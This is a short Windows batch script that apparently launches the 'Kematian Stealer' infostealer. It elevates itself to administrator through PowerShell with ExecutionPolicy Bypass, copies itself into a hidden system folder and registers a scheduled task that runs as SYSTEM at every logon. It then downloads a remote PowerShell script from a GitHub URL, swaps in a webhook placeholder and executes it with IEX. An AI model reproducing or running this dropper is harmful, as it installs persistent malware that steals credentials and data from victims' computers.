@echo off
cd /d %~dp0

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)

set "pathplz=%appdata%\Kematian"

if not exist %pathplz% (
    mkdir %pathplz%
    attrib +s +h %pathplz%
)

copy %~f0 %pathplz%\Kematian.bat >nul
schtasks /Create /TN "Kematian" /TR "cmd.exe /c '%USERPROFILE%\Appdata\Roaming\Kematian\Kematian.bat'" /SC ONLOGON /RU SYSTEM /F >nul

powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | IEX"

Exit 0